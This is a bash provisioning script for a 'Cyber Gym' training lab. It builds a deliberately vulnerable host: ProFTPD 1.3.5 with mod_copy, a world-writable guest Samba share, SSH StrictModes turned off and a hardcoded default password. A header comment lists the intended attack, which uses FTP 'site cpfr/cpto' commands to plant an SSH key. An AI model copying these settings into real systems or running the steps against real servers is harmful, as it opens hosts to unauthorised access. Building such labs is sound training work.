#!/bin/bash
​
##
## Author: Tommy Haycraft
## Modified for the Cyber Gym by: Andrew Bomberger
## [ Path of attack ]
## Initial access:
## https://www.exploit-db.com/exploits/36742
## copy ssh pub key to incatnito smb share
## nc [server] 21
## site cpfr /share/incatnito/[pubkey]
## site cpto /home/incatnito/.ssh/authorized_keys
## [log in as incatnito]
##
​
if [ "$EUID" -ne 0 ]
	then echo "Run as root"
	exit
fi
apt update
apt install make build-essential gcc git samba -y
​
## Install and configure proftpd
mkdir /opt/proftpd
​
tar -xvf proftpd.tar.gz -C /opt/proftpd
chmod 777 /opt/proftpd -R
cd /opt/proftpd/proftpd-1.3.5
useradd -c proftpd -d /srv/ftp -s /usr/bin/proftpdshell -U proftpd
install -v -d -m775 -o proftpd -g proftpd /srv/ftp
ln -v -s /bin/false /usr/bin/proftpdshell
echo /usr/bin/proftpdshell >> /etc/shells
su -s /bin/bash -c "./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var/run --with-modules=mod_copy" proftpd
su -s /bin/bash -c "make" proftpd
make install
sed -i 's/nobody/proftpd/g' /etc/proftpd.conf
sed -i 's/nogroup/proftpd/g' /etc/proftpd.conf
​
## Create share directories
mkdir /share
mkdir /share/incatnito
mkdir /share/IT
​
## Turn off checking of authorized_keys ownership
echo "StrictModes no" >> /etc/ssh/sshd_config
systemctl restart ssh
​
​
## Create newuser.sh file
echo "#!/bin/bash" > /share/IT/newuser.sh
echo "#Going forward, please use this script for new users." >> /share/IT/newuser.sh
echo "###We also need to verify existing users permissions.###" >> /share/IT/newuser.sh
echo "user=\$1" >> /share/IT/newuser.sh
echo "useradd -d /home/\$user -s /bin/bash -U \$user -p \$(perl -e 'print crypt("Abc123456", "salt")')" >> /share/IT/newuser.sh
echo "passwd --expire \$user" >> /share/IT/newuser.sh
echo "mkdir /home/\$user" >> /share/IT/newuser.sh
echo "chown \$user:\$user /home/\$user" >> /share/IT/newuser.sh
echo "mkdir /share/\$user" >> /share/IT/newuser.sh
echo "echo \"[\$user]\" >> /etc/samba/smb.conf" >> /share/IT/newuser.sh
echo "echo \"path = /share/\$user\" >> /etc/samba/smb.conf" >> /share/IT/newuser.sh
echo "echo \"guest ok = no\" >> /etc/samba/smb.conf" >> /share/IT/newuser.sh
echo "chown \$user:\$user /share/\$user" >> /share/IT/newuser.sh
chown root:root /share/IT/newuser.sh
chmod 744 /share/IT/newuser.sh
​
## Read only IT share
echo "[IT]" >> /etc/samba/smb.conf
echo "path = /share/IT" >> /etc/samba/smb.conf
echo "guest ok = yes" >> /etc/samba/smb.conf
echo "read only = yes" >> /etc/samba/smb.conf
​
## Read/write incatnito share/user
useradd -d /home/incatnito -s /bin/bash -U incatnito
mkdir /home/incatnito
mkdir /home/incatnito/.ssh/
chmod 774 /home/incatnito/.ssh/
chown incatnito:incatnito /home/incatnito -R
usermod -a -G incatnito proftpd
echo "[incatnito]" >> /etc/samba/smb.conf
echo "path = /share/incatnito" >> /etc/samba/smb.conf
echo "guest ok = yes" >> /etc/samba/smb.conf
echo "read only = no" >> /etc/samba/smb.conf
echo "writeable = yes" >> /etc/samba/smb.conf
chmod 777 /share/incatnito
​
## Start proftpd
proftpd

## Setup SSH Login Greeting
mkdir /usr/local/src/nyancat && cd /usr/local/src/nyancat
git clone https://github.com/klange/nyancat.git
echo "[*] Cloned Nyancat into dir /usr/local/src/nyancat ..."
make
echo "[!!] Display custom flag by modifying the printf statement in line 905 of nyancat.c"
echo "[-->] run 'make' again in the script root to recompile the modified nyancat.c"

## Update SSH Greeting automation
echo "if [[ -n $SSH_CONNECTION ]] ; then" >> /home/incatnito/.bash_profile
echo "     /usr/local/src/nyancat/src/nyancat" >> /home/incatnito/.bash_profile
echo "fi" >> /home/incatnito/.bash_profile